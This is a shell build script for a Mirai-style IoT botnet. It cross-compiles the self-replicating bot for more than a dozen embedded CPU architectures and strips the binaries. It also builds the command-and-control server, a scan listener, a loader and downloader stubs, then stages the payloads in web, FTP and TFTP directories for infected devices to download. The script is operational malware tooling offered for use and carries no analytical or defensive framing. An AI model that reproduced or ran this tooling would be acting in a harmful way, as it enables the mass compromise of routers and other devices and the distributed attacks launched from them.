#!/bin/bash
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i486/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mips64/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
FLAGS=""
domain=""
domainres=""
if [ "$1" == "domain" ]
then
	domain="-DUSEDOMAIN"
    domainres=" with domain"
fi
rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html/bins/*
rm -rf /var/www/html/*
rm -rf /var/lib/tftpboot
rm -rf /var/www/html/Kuso69/*
mkdir /var/ftp/pub
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/bins
mkdir /var/www/html/Kuso69
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/
go build -o loader/scanListen scanListen.go
echo "COMPILING i586$domainres"
compile_bot i586 tmp.x86 "$FLAGS $domain -static -DSELFREP"
echo "COMPILING i686$domainres"
compile_bot i686 tmp.i686 "$FLAGS $domain -static -DSELFREP"
echo "COMPILING i486$domainres"
compile_bot i486 tmp.i486 "$FLAGS $domain -static -DSELFREP"
echo "COMPILING x86_64$domainres"
compile_bot x86_64 tmp.x86_64 "$FLAGS $domain -static -DSELFREP"
echo "COMPILING mips64$domainres"
compile_bot mips64 tmp.mips64 "$FLAGS $domain -static -DSELFREP"
echo "COMPILING mips$domainres"
compile_bot mips tmp.mips "$FLAGS $domain -static -DSELFREP"
echo "COMPILING mipsel$domainres"
compile_bot mipsel tmp.mpsl "$FLAGS $domain -static -DSELFREP"
echo "COMPILING armv4l$domainres"
compile_bot armv4l tmp.arm "$FLAGS $domain -static -DSELFREP"
echo "COMPILING armv5l$domainres"
compile_bot armv5l tmp.arm5 "$FLAGS $domain -DSELFREP"
echo "COMPILING armv6l$domainres"
compile_bot armv6l tmp.arm6 "$FLAGS $domain -static -DSELFREP"
echo "COMPILING armv7l$domainres"
compile_bot armv7l tmp.arm7 "$FLAGS $domain -static -DSELFREP"
echo "COMPILING ppc$domainres"
compile_bot powerpc tmp.ppc "$FLAGS $domain -static -DSELFREP"
echo "COMPILING sparc$domainres"
compile_bot sparc tmp.spc "$FLAGS $domain -static -DSELFREP"
echo "COMPILING m68k$domainres"
compile_bot m68k tmp.m68k "$FLAGS $domain -static -DSELFREP"
echo "COMPILING sh4$domainres"
compile_bot sh4 tmp.sh4 "$FLAGS $domain -static -DSELFREP"
echo "COMPILING PPC440$domainres"
compile_bot powerpc-440fp tmp.ppc440fp "$FLAGS $domain -static -DSELFREP"
cp release/tmp* /var/www/html/bins
cp release/tmp* /var/ftp/
mv release/tmp* /var/lib/tftpboot
rm -rf release
###################################################################
gcc -static -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader
###################################################################
armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm6
